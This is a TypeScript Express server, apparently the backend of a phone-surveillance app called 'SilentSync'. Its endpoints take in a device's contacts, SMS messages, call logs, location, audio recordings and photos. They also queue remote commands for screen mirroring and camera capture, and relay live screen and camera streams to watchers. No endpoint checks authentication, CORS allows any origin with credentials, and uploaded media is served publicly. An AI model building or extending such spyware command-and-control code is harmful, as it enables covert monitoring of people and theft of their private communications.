import express from "express";
import cors from "cors";
import path from "path";
import fs from "fs";
import { fileURLToPath } from "url";
import admin from "firebase-admin";
import { getFirestore } from "firebase-admin/firestore";
import dotenv from "dotenv";
import { WebSocketServer, WebSocket } from "ws";

// Load environment variables from .env file
dotenv.config();

// Helper for filesystem paths (local only)
// Check specifically for Cloudflare Workers (not Render)
const isCloudflareWorker =
  typeof (globalThis as any).WebSocketPair !== "undefined";
let __filename: string, __dirname: string;

if (!isCloudflareWorker) {
  __filename = fileURLToPath(import.meta.url);
  __dirname = path.dirname(__filename);
}

// Initialize Firebase Admin
const getFirebaseConfig = () => {
  const config = process.env.FIREBASE_CONFIG;
  if (config) {
    try {
      return JSON.parse(config);
    } catch (e) {
      console.error("Failed to parse FIREBASE_CONFIG from env:", e);
    }
  }
  // Try to read from local file (development only)
  if (!isCloudflareWorker) {
    try {
      return JSON.parse(
        fs.readFileSync(path.join(__dirname, "firebase-config.json"), "utf8"),
      );
    } catch (e) {
      console.warn("firebase-config.json not found, using env vars only");
    }
  }
  return {};
};

const getServiceAccount = () => {
  const sa = process.env.FIREBASE_SERVICE_ACCOUNT;
  if (sa) {
    try {
      const parsed = JSON.parse(sa);
      if (parsed.private_key) {
        parsed.private_key = parsed.private_key.replace(/\\n/g, "\n");
      }
      return parsed;
    } catch (e) {
      console.error("Failed to parse FIREBASE_SERVICE_ACCOUNT from env:", e);
    }
  }
  // Try to read from local file (development only)
  if (!isCloudflareWorker) {
    try {
      const files = fs.readdirSync(__dirname);
      const serviceAccountFile = files.find(
        (f) => f.includes("firebase-adminsdk") && f.endsWith(".json"),
      );
      if (serviceAccountFile) {
        console.log(
          `[Firebase] Found service account file: ${serviceAccountFile}`,
        );
        const parsed = JSON.parse(
          fs.readFileSync(path.join(__dirname, serviceAccountFile), "utf8"),
        );
        console.log(
          `[Firebase] Parsed service account, has private_key: ${!!parsed.private_key}`,
        );
        console.log(
          `[Firebase] Loaded service account from ${serviceAccountFile}`,
        );
        return parsed;
      } else {
        console.log("[Firebase] No service account file found in directory");
      }
    } catch (e) {
      console.warn("[Firebase] Error loading service account file:", e);
    }
  }
  return null;
};

// Initialize Firebase
console.log("[Firebase] Starting initialization...");
if (admin.apps.length === 0) {
  const serviceAccount = getServiceAccount();
  const firebaseConfig = getFirebaseConfig();

  console.log(`[Firebase] Service account loaded: ${!!serviceAccount}`);
  if (serviceAccount) {
    console.log(`[Firebase] Project ID: ${serviceAccount.project_id}`);
    console.log(`[Firebase] Client email: ${serviceAccount.client_email}`);
    console.log(
      `[Firebase] Private key length: ${serviceAccount.private_key?.length || 0}`,
    );
    console.log(
      `[Firebase] Private key starts with: ${serviceAccount.private_key?.substring(0, 30)}`,
    );

    try {
      admin.initializeApp({
        credential: admin.credential.cert(serviceAccount),
        projectId: firebaseConfig.projectId || serviceAccount.project_id,
      });
      console.log("Firebase Admin initialized successfully");
    } catch (initError) {
      console.error("[Firebase] Initialization error:", initError);
      throw initError;
    }
  } else {
    console.error(
      "Firebase Service Account not found in environment or local files.",
    );
    console.error("Please set FIREBASE_SERVICE_ACCOUNT environment variable.");
  }
}

const db = getFirestore();
const app = express();

// CORS configuration
const corsOrigins = process.env.CORS_ORIGINS
  ? process.env.CORS_ORIGINS.split(",").map((o) => o.trim())
  : [
      "http://localhost:3000",
      "http://localhost:5173",
      "http://127.0.0.1:3000",
      "*",
    ];

app.use(
  cors({
    origin: corsOrigins,
    credentials: true,
  }),
);
app.use(express.json({ limit: process.env.MAX_FILE_SIZE || "50mb" }));

// Request Logger
app.use((req, res, next) => {
  console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
  next();
});

// Health check endpoint
app.get("/health", (req, res) => {
  res.json({
    status: "healthy",
    timestamp: new Date().toISOString(),
    environment: isCloudflareWorker ? "cloudflare-worker" : "node",
  });
});

// --- API Routes ---

// Register Device
app.post("/api/register-device", async (req, res) => {
  const { deviceId, deviceName, ownerUid } = req.body;
  if (!deviceId) return res.status(400).json({ error: "deviceId is required" });

  try {
    const deviceRef = db.collection("devices").doc(deviceId);
    await deviceRef.set(
      {
        deviceId,
        deviceName: deviceName || `Device ${deviceId.substr(0, 4)}`,
        registeredAt: admin.firestore.FieldValue.serverTimestamp(),
        lastSyncAt: admin.firestore.FieldValue.serverTimestamp(),
        status: "active",
        isPublic: true,
        ownerUid: ownerUid || null,
      },
      { merge: true },
    );

    console.log(`[Registration] Device registered: ${deviceId}`);
    res.json({
      success: true,
      message: "Device linked successfully",
      deviceId,
    });
  } catch (error) {
    console.error("Registration error:", error);
    res.status(500).json({ error: "Failed to link device" });
  }
});

// Upload Data (contacts, messages, call logs, apps, stats, locations)
app.post("/api/upload/:deviceId", async (req, res) => {
  const { deviceId } = req.params;
  const { type, data } = req.body;

  if (!deviceId || !type || !data) {
    return res
      .status(400)
      .json({ error: "Missing required fields: deviceId, type, data" });
  }

  try {
    const deviceRef = db.collection("devices").doc(deviceId);

    // Update last sync time
    await deviceRef.set(
      {
        lastSyncAt: admin.firestore.FieldValue.serverTimestamp(),
        status: "active",
      },
      { merge: true },
    );

    const collectionName = type === "call_logs" ? "call_logs" : type;

    // Handle system stats specially
    if (type === "system_stats") {
      await deviceRef.set({ stats: data }, { merge: true });
      console.log(`[Upload] System stats updated for ${deviceId}`);
      return res.json({ success: true, type: "system_stats" });
    }

    const subColRef = deviceRef.collection(collectionName);

    if (Array.isArray(data)) {
      const batch = db.batch();
      data.forEach((item: any) => {
        let docId: string | undefined;

        // Generate unique document IDs for deduplication
        if (type === "call_logs" && item.timestamp && item.phoneNumber) {
          const phoneNumber =
            typeof item.phoneNumber === "string"
              ? item.phoneNumber
              : String(item.phoneNumber);
          docId = `${item.timestamp}_${phoneNumber.replace(/[^0-9]/g, "")}`;
        } else if (type === "messages" && item.date && item.address) {
          const address =
            typeof item.address === "string"
              ? item.address
              : String(item.address);
          docId = `${item.date}_${address.replace(/[^0-9]/g, "")}`;
        } else if (type === "contacts" && item.displayName) {
          const phone =
            item.phoneNumbers?.[0]?.number || item.phoneNumbers?.[0] || "";
          const phoneNumber = typeof phone === "string" ? phone : String(phone);
          docId = `${item.displayName.replace(/\s/g, "_")}_${phoneNumber.replace(/[^0-9]/g, "")}`;
        } else if (type === "apps" && item.packageName) {
          docId = item.packageName.replace(/\./g, "_");
        } else if (type === "locations" && item.timestamp) {
          docId = `${item.timestamp}_${Math.random().toString(36).substr(2, 5)}`;
        }

        const docRef = docId ? subColRef.doc(docId) : subColRef.doc();
        batch.set(
          docRef,
          {
            ...item,
            syncedAt: admin.firestore.FieldValue.serverTimestamp(),
          },
          { merge: true },
        );
      });

      await batch.commit();
      console.log(`[Upload] ${data.length} ${type} uploaded for ${deviceId}`);
    } else {
      await subColRef.add({
        ...data,
        syncedAt: admin.firestore.FieldValue.serverTimestamp(),
      });
      console.log(`[Upload] Single ${type} uploaded for ${deviceId}`);
    }

    res.json({ success: true, count: Array.isArray(data) ? data.length : 1 });
  } catch (error) {
    console.error("Upload error:", error);
    res
      .status(500)
      .json({ error: "Failed to upload data", details: String(error) });
  }
});

// Dedicated Location Endpoint
app.post("/api/location/:deviceId", async (req, res) => {
  const { deviceId } = req.params;
  const { latitude, longitude, accuracy, timestamp } = req.body;

  if (!deviceId || latitude === undefined || longitude === undefined) {
    return res.status(400).json({
      error: "Missing required fields: deviceId, latitude, longitude",
    });
  }

  try {
    const deviceRef = db.collection("devices").doc(deviceId);

    await deviceRef.collection("locations").add({
      latitude,
      longitude,
      accuracy: accuracy || null,
      timestamp: timestamp
        ? new Date(timestamp)
        : admin.firestore.FieldValue.serverTimestamp(),
      syncedAt: admin.firestore.FieldValue.serverTimestamp(),
    });

    await deviceRef.set(
      {
        lastSyncAt: admin.firestore.FieldValue.serverTimestamp(),
        status: "active",
      },
      { merge: true },
    );

    console.log(
      `[Location] Updated for ${deviceId}: ${latitude}, ${longitude}`,
    );
    res.json({ success: true });
  } catch (error) {
    console.error("Location update error:", error);
    res.status(500).json({ error: "Failed to update location" });
  }
});

// Send Command (from Dashboard to Device)
app.post("/api/command/:deviceId", async (req, res) => {
  const { deviceId } = req.params;
  const { type, payload, message } = req.body;

  if (!deviceId || !type) {
    return res.status(400).json({ error: "Missing deviceId or type" });
  }

  try {
    const deviceRef = db.collection("devices").doc(deviceId);
    const commandRef = deviceRef.collection("commands").doc();

    const commandData: any = {
      type,
      status: "pending",
      createdAt: admin.firestore.FieldValue.serverTimestamp(),
    };

    if (payload) commandData.payload = payload;
    if (message) commandData.payload = { message };

    // Handle screen_mirror command
    if (type === "screen_mirror") {
      const streamUrl = `wss://silentsync-backend.onrender.com/screen-stream?deviceId=${deviceId}`;
      commandData.payload = { streamUrl };
      console.log(`[Command] Screen mirror payload:`, commandData.payload);
      console.log(
        `[Command] Screen mirror requested for ${deviceId}, streamUrl: ${streamUrl}`,
      );
      await commandRef.set(commandData);
      return res.json({ success: true, streamUrl, commandId: commandRef.id });
    }

    // Handle camera_capture command
    if (type === "camera_capture") {
      // Use WebSocket URL based on environment
      const protocol = req.secure || isCloudflareWorker ? "wss" : "ws";
      const host = isCloudflareWorker
        ? "silentsync-backend.onrender.com"
        : req.headers.host;
      const streamUrl = `${protocol}://${host}/camera-stream?deviceId=${deviceId}`;
      const cameraType = payload?.camera || "back";
      commandData.payload = { streamUrl, camera: cameraType };
      console.log(`[Command] Camera capture payload:`, commandData.payload);
      console.log(
        `[Command] Camera capture requested for ${deviceId} (${cameraType} camera), streamUrl: ${streamUrl}`,
      );
      await commandRef.set(commandData);
      return res.json({
        success: true,
        streamUrl,
        commandId: commandRef.id,
        camera: cameraType,
      });
    }

    // Include message if provided (for display_message command)
    if (message) {
      commandData.message = message;
    }

    await commandRef.set(commandData);

    console.log(`[Command] Sent to ${deviceId}: ${type}`);
    res.json({ success: true, commandId: commandRef.id });
  } catch (error) {
    console.error("Command error:", error);
    res.status(500).json({ error: "Failed to send command" });
  }
});

// Fetch Pending Commands (Device polls this)
app.get("/api/commands/:deviceId", async (req, res) => {
  const { deviceId } = req.params;

  try {
    const commandsRef = db
      .collection("devices")
      .doc(deviceId)
      .collection("commands");
    const snapshot = await commandsRef.where("status", "==", "pending").get();

    const commands = snapshot.docs.map((doc) => ({
      id: doc.id,
      ...doc.data(),
    }));

    // Mark as "sent" so device doesn't get them again
    if (commands.length > 0) {
      const batch = db.batch();
      snapshot.docs.forEach((doc) => {
        batch.update(doc.ref, { status: "sent" });
      });
      await batch.commit();
      console.log(
        `[Commands] ${commands.length} commands fetched for ${deviceId}`,
      );
    }

    res.json({ commands });
  } catch (error) {
    console.error("Fetch commands error:", error);
    res.status(500).json({ error: "Failed to fetch commands" });
  }
});

// Update Command Status (Device reports execution result)
app.post("/api/command/:deviceId/:commandId/status", async (req, res) => {
  const { deviceId, commandId } = req.params;
  const { status, result } = req.body;

  if (!status || !["executed", "failed", "sent", "pending"].includes(status)) {
    return res.status(400).json({
      error: "Invalid status. Must be: executed, failed, sent, or pending",
    });
  }

  try {
    const commandRef = db
      .collection("devices")
      .doc(deviceId)
      .collection("commands")
      .doc(commandId);
    await commandRef.update({
      status,
      result: result || {},
      executedAt: admin.firestore.FieldValue.serverTimestamp(),
    });

    console.log(
      `[Command] Status updated for ${deviceId}/${commandId}: ${status}`,
    );
    res.json({ success: true });
  } catch (error) {
    console.error("Update command status error:", error);
    res.status(500).json({ error: "Failed to update command status" });
  }
});

// Handle Audio Uploads
app.post("/api/upload-audio/:deviceId", async (req, res) => {
  const { deviceId } = req.params;
  const { audio } = req.body;

  if (!deviceId || !audio) {
    return res
      .status(400)
      .json({ error: "Missing required fields: deviceId, audio" });
  }

  // Cloudflare Worker mode: return error (use R2 for production)
  if (isCloudflareWorker) {
    return res.status(501).json({
      error:
        "Audio storage requires Cloudflare R2 or external storage on this platform. " +
        "Please configure R2 bucket or use a Node.js host for local disk storage.",
    });
  }

  try {
    const uploadsDir = path.join(__dirname, "public", "uploads");
    if (!fs.existsSync(uploadsDir)) {
      fs.mkdirSync(uploadsDir, { recursive: true });
    }

    const buffer = Buffer.from(audio, "base64");
    const localFileName = `audio_${deviceId}_${Date.now()}.m4a`;
    const filePath = path.join(uploadsDir, localFileName);

    fs.writeFileSync(filePath, buffer);

    const publicUrl = `/uploads/${localFileName}`;

    // Try to save to Firestore, but don't fail if it doesn't work
    try {
      const audioId = localFileName.replace(/\./g, "_");
      await db
        .collection("devices")
        .doc(deviceId)
        .collection("audio")
        .doc(audioId)
        .set(
          {
            fileName: localFileName,
            url: publicUrl,
            syncedAt: admin.firestore.FieldValue.serverTimestamp(),
          },
          { merge: true },
        );
      console.log(`[Audio] Uploaded for ${deviceId}: ${localFileName}`);
    } catch (firestoreError) {
      console.error(
        "[Audio] Firestore save failed, but file saved:",
        firestoreError,
      );
      // Continue anyway - the file is saved
    }

    res.json({ success: true, url: publicUrl, fileName: localFileName });
  } catch (error) {
    console.error("Audio upload error:", error);
    res.status(500).json({ error: "Failed to save audio" });
  }
});

// Fetch audio files for a device directly from uploads directory
app.get("/api/audio/:deviceId", async (req, res) => {
  const { deviceId } = req.params;

  try {
    console.log(`[Audio API] Fetching audio for device: ${deviceId}`);
    const uploadsDir = path.join(__dirname, "public", "uploads");
    if (!fs.existsSync(uploadsDir)) {
      console.log(`[Audio API] Uploads directory not found`);
      return res.json([]);
    }

    const files = fs.readdirSync(uploadsDir);
    console.log(`[Audio API] Found ${files.length} files in uploads directory`);
    const audioFiles = files
      .filter(
        (file) =>
          file.startsWith(`audio_${deviceId}_`) && file.endsWith(".m4a"),
      )
      .map((file) => ({
        id: file.replace(/\./g, "_"),
        fileName: file,
        url: `/uploads/${file}`,
        syncedAt: fs.statSync(path.join(uploadsDir, file)).mtime,
      }))
      .sort((a, b) => b.syncedAt - a.syncedAt);

    console.log(`[Audio API] Returning ${audioFiles.length} audio files`);
    res.json(audioFiles);
  } catch (error) {
    console.error("Fetch audio error:", error);
    res.status(500).json({ error: "Failed to fetch audio files" });
  }
});

// Handle Photo Uploads
app.post("/api/upload-photo/:deviceId", async (req, res) => {
  const { deviceId } = req.params;
  const { fileName, base64 } = req.body;

  console.log(
    `[Photo] Upload request: deviceId=${deviceId}, fileName=${fileName}`,
  );

  if (!deviceId || !fileName || !base64) {
    console.error("[Photo] Missing required fields");
    return res
      .status(400)
      .json({ error: "Missing required fields: deviceId, fileName, base64" });
  }

  // Cloudflare Worker mode: return error (use R2 for production)
  if (isCloudflareWorker) {
    console.error(
      "[Photo] Cloudflare Worker mode not supported for local storage",
    );
    return res.status(501).json({
      error:
        "Photo storage requires Cloudflare R2 or external storage on this platform. " +
        "Please configure R2 bucket or use a Node.js host for local disk storage.",
    });
  }

  try {
    const uploadsDir = path.join(__dirname, "public", "uploads");
    if (!fs.existsSync(uploadsDir)) {
      console.log(`[Photo] Creating uploads directory: ${uploadsDir}`);
      fs.mkdirSync(uploadsDir, { recursive: true });
    }

    const buffer = Buffer.from(base64, "base64");
    const localFileName = fileName.replace(/[^a-zA-Z0-9.]/g, "_");
    const filePath = path.join(uploadsDir, localFileName);

    console.log(`[Photo] Writing file: ${filePath}`);
    fs.writeFileSync(filePath, buffer);

    const publicUrl = `/uploads/${localFileName}`;
    const isStreamLatest = localFileName === "camera_stream_latest.jpg";
    const photoId = isStreamLatest
      ? "camera_stream_latest"
      : localFileName.replace(/\./g, "_");

    await db
      .collection("devices")
      .doc(deviceId)
      .collection("photos")
      .doc(photoId)
      .set(
        {
          fileName: localFileName,
          url: publicUrl,
          syncedAt: admin.firestore.FieldValue.serverTimestamp(),
          updatedAt: admin.firestore.FieldValue.serverTimestamp(),
        },
        { merge: true },
      );

    console.log(`[Photo] Uploaded for ${deviceId}: ${localFileName}`);
    res.json({ success: true, url: publicUrl, fileName: localFileName });
  } catch (error) {
    console.error("[Photo] Upload error:", error);
    res.status(500).json({
      error: "Failed to save photo",
      details: error instanceof Error ? error.message : String(error),
    });
  }
});

// Serve static photos (Local only)
if (!isCloudflareWorker) {
  const uploadsDir = path.join(__dirname, "public", "uploads");

  // Create uploads directory if it doesn't exist
  if (!fs.existsSync(uploadsDir)) {
    fs.mkdirSync(uploadsDir, { recursive: true });
  }

  app.use("/uploads", cors(), express.static(uploadsDir));
  console.log(`[Static] Serving uploads from ${uploadsDir}`);
}

// 404 handler
app.use((req, res) => {
  res.status(404).json({ error: "Endpoint not found", path: req.path });
});

// Error handler
app.use(
  (
    err: any,
    req: express.Request,
    res: express.Response,
    next: express.NextFunction,
  ) => {
    console.error("Unhandled error:", err);
    res
      .status(500)
      .json({ error: "Internal server error", message: err.message });
  },
);

// WebSocket Server for Screen Streaming
const screenStreams = new Map<string, Set<WebSocket>>();

// WebSocket Server for Camera Streaming
const cameraStreams = new Map<string, Set<WebSocket>>();

// Start local server if not on Cloudflare Worker
// Note: Render is NOT a Cloudflare Worker, so WebSocket server should run there
if (!isCloudflareWorker) {
  const PORT = parseInt(process.env.PORT || "3000", 10);

  const server = app.listen(PORT, "0.0.0.0", () => {
    console.log(`\n╔════════════════════════════════════════════════════════╗`);
    console.log(`║      SilentSync Backend Server                         ║`);
    console.log(`╠════════════════════════════════════════════════════════╣`);
    console.log(
      `║  Environment: ${process.env.NODE_ENV || "development"}${" ".repeat(37 - (process.env.NODE_ENV || "development").length)}║`,
    );
    console.log(`║  Port: ${PORT}${" ".repeat(45 - String(PORT).length)}║`);
    console.log(
      `║  Health Check: http://localhost:${PORT}/health${" ".repeat(25 - String(PORT).length)}║`,
    );
    console.log(`╚════════════════════════════════════════════════════════╝\n`);
  });

  // WebSocket Server for Screen Streaming
  const wss = new WebSocketServer({ server, path: "/screen-stream" });

  wss.on("connection", (ws: WebSocket, request: any) => {
    const url = new URL(request.url || "", `http://${request.headers.host}`);
    const deviceId = url.searchParams.get("deviceId");

    if (deviceId) {
      console.log(`[WebSocket] Screen stream connected for device ${deviceId}`);

      ws.on("message", (data: Buffer) => {
        // Broadcast screen frame to all clients watching this device
        wss.clients.forEach((client: WebSocket) => {
          if (client !== ws && client.readyState === WebSocket.OPEN) {
            client.send(data);
          }
        });
      });

      ws.on("close", () => {
        console.log(
          `[WebSocket] Screen stream disconnected for device ${deviceId}`,
        );
      });

      ws.on("error", (error: any) => {
        console.error(`[WebSocket] Error for device ${deviceId}:`, error);
      });
    } else {
      ws.close();
    }
  });

  // WebSocket Server for Camera Streaming
  const cameraWss = new WebSocketServer({ server, path: "/camera-stream" });

  cameraWss.on("connection", (ws: WebSocket, request: any) => {
    const url = new URL(request.url || "", `http://${request.headers.host}`);
    const deviceId = url.searchParams.get("deviceId");

    if (deviceId) {
      console.log(`[WebSocket] Camera stream connected for device ${deviceId}`);

      ws.on("message", (data: Buffer) => {
        // Broadcast camera frame to all clients watching this device
        cameraWss.clients.forEach((client: WebSocket) => {
          if (client !== ws && client.readyState === WebSocket.OPEN) {
            client.send(data);
          }
        });
      });

      ws.on("close", () => {
        console.log(
          `[WebSocket] Camera stream disconnected for device ${deviceId}`,
        );
      });

      ws.on("error", (error: any) => {
        console.error(
          `[WebSocket] Camera error for device ${deviceId}:`,
          error,
        );
      });
    } else {
      ws.close();
    }
  });
}

// Export for Cloudflare Workers
export default {
  async fetch(request: Request, env: any, ctx: any) {
    // For Cloudflare Workers, we need to use a different approach
    // This is a simplified version - full Express on Workers requires an adapter
    return new Response(
      JSON.stringify({
        status: "ok",
        message: "SilentSync Backend is running on Cloudflare Workers",
        timestamp: new Date().toISOString(),
      }),
      {
        status: 200,
        headers: { "Content-Type": "application/json" },
      },
    );
  },
};
